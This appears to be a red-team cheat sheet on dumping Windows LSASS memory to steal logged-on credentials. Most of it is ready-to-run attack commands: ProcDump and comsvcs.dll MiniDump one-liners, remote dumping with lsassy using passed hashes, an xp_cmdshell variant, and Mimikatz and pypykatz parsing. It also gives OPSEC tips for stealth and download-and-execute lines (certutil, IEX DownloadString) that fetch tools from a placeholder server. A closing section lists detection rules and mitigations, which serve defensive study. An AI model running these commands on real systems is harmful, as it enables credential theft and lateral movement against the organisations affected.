# <span style="color:rgb(255, 192, 0)">LSASS Dumping Methods</span>

LSASS (Local Security Authority Subsystem Service, `lsass.exe`) is the Windows process that handles authentication, password changes, and access tokens. Dumping LSASS memory reveals logged-on credentials, Kerberos tickets, and other secrets.

**Target**: `lsass.exe` (PID varies, typically ~500-700)

---

## <span style="color:rgb(255, 0, 0)">1. Task Manager (GUI)</span>

### Interactive
```
1. Open Task Manager (Ctrl+Shift+Esc)
2. Go to Details tab
3. Right-click lsass.exe
4. Click "Create dump file"
5. Saved to: %temp%\lsass.DMP
```

**OPSEC**: Very obvious on an interactive/RDP session. Task Manager creation may be logged.

---

## <span style="color:rgb(0, 176, 240)">2. ProcDump (Sysinternals)</span>

### Download & Execute
```batch
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### With Known PID
```batch
procdump.exe -accepteula -ma 504 lsass.dmp
```

### Remote Execution
```bash
# From Kali
crackmapexec smb 10.0.0.50 -u Admin -H HASH --procdump
```

```powershell
# PowerShell download + execute
certutil -urlcache -f http://SERVER/procdump.exe procdump.exe
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**OPSEC**: Microsoft signed tool, less suspicious than Mimikatz. Still creates a file.

---

## <span style="color:rgb(146, 208, 80)">3. comsvcs.dll (Built-in, No Extra Tools)</span>

### Via rundll32
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full
```

### Find LSASS PID
```cmd
tasklist /fi "imagename eq lsass.exe"
```

### One-liner
```cmd
powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\lsass.dmp full"
```

### Extraction
```cmd
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 680 C:\temp\lsass.dmp full
```

**OPSEC**: Uses only built-in Windows binaries (LOLBIN). No downloads needed.

---

## <span style="color:rgb(112, 48, 160)">4. SharpDump</span>

### Execute via Cobalt Strike / Beacon
```powershell
SharpDump.exe
```

### Source: https://github.com/GhostPack/SharpDump
```powershell
# PowerShell load
IEX (New-Object Net.WebClient).DownloadString('http://SERVER/SharpDump.ps1')
SharpDump
```

### Manual Build
```powershell
csc.exe /target:exe /out:SharpDump.exe SharpDump.cs
```

**OPSEC**: Writes to disk unless modified. Can be loaded reflectively.

---

## <span style="color:rgb(0, 32, 96)">5. lsassy (Python)</span>

### Installation
```bash
pip install lsassy
```

### Remote Dump
```bash
# With credentials
lsassy -d contoso.local -u Administrator -p Passw0rd 10.0.0.50

# With hashes
lsassy -d contoso.local -u Administrator -H NTLM_HASH 10.0.0.50

# Multiple targets
lsassy -d contoso.local -u Administrator -H HASH 10.0.0.50 10.0.0.51 10.0.0.52
```

### Using Custom Dump Method
```bash
# Use comsvcs.dll method
lsassy -d contoso.local -u Administrator -p Passw0rd 10.0.0.50 -m comsvcs

# Use procdump method
lsassy -d contoso.local -u Administrator -p Passw0rd 10.0.0.50 -m procdump
```

### Output Formats
```bash
# JSON output
lsassy -d contoso.local -u Administrator -p Passw0rd 10.0.0.50 -f json

# Greppable
lsassy -d contoso.local -u Administrator -p Passw0rd 10.0.0.50 -f greppable
```

### Mimikatz Mode
```bash
lsassy -d contoso.local -u Administrator -p Passw0rd 10.0.0.50 -m comsvcs --mimikatz
```
- Dumps LSASS with comsvcs.dll, downloads dump, runs `sekurlsa::logonpasswords` locally

**OPSEC**: Network-based, leaves no disk artifacts on target.

---

## <span style="color:rgb(94, 18, 18)">6. Other Methods</span>

### SQL Server xp_cmdshell
```sql
EXEC xp_cmdshell 'procdump -ma lsass.exe C:\temp\lsass.dmp';
```

### PowerShell Direct
```powershell
# Using Win32 APIs
$process = Get-Process lsass
$dump = [System.IO.Path]::Combine($env:TEMP, "lsass.dmp")
# Requires SeDebugPrivilege
```

### nanodump
```powershell
# https://github.com/helpsystems/nanodump
nanodump.exe -o lsass.dmp
```
- Minimal footprint LSASS dumper
- Various techniques (syscall, NtCreateThreadEx, etc.)

---

## <span style="color:rgb(255, 255, 0)">7. Parsing Dumps</span>

### With Mimikatz (Offline)
```mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### With pypykatz
```bash
# Python alternative to Mimikatz
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

### With SharpKatz
```powershell
SharpKatz.exe --Command logonpasswords --Source dumpfile --File lsass.dmp
```

---

## <span style="color:rgb(255, 0, 0)">Detection & Prevention</span>

| Method | Detection Signal |
|--------|-----------------|
| Task Manager | User interaction, dump file in %temp% |
| ProcDump | Process creation (4688) with `procdump` and `-ma lsass.exe` |
| comsvcs.dll | 4688: `rundll32` with `comsvcs.dll, MiniDump` and lsass PID |
| SharpDump | .NET compilation event, file write |
| lsassy | Network traffic, WMI/SMB connections, file creation |
| nanodump | Sysmon event 10 (Lsass access from non-standard process) |

### Sysmon Rules
```xml
<!-- Detect LSASS dump via comsvcs.dll -->
<RuleGroup name="" groupRelation="or">
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">comsvcs.dll,MiniDump</CommandLine>
    <CommandLine condition="contains">lsass.dmp</CommandLine>
  </ProcessCreate>
</RuleGroup>

<!-- Detect procdump LSASS dump -->
<RuleGroup name="" groupRelation="or">
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">procdump</CommandLine>
    <CommandLine condition="contains">-ma lsass</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

### LSA Protection
```reg
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]
"RunAsPPL"=dword:00000001
```
- Blocks non-Microsoft processes from opening LSASS
- Mitigates most dump methods except those with kernel driver support

### Credential Guard
- Virtualizes LSASS using Hyper-V
- All credential dumping via memory becomes impossible
- Only encrypted keys are accessible (still useful for Kerberos attacks)

---

## <span style="color:rgb(0, 176, 240)">Quick Reference</span>

```bash
# Method 1: Built-in comsvcs.dll (stealthiest)
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 504 C:\temp\lsass.dmp full

# Method 2: ProcDump (signed by Microsoft)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: lsassy (remote, no artifact)
lsassy -d DOMAIN -u ADMIN -H HASH TARGET

# Parse offline
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
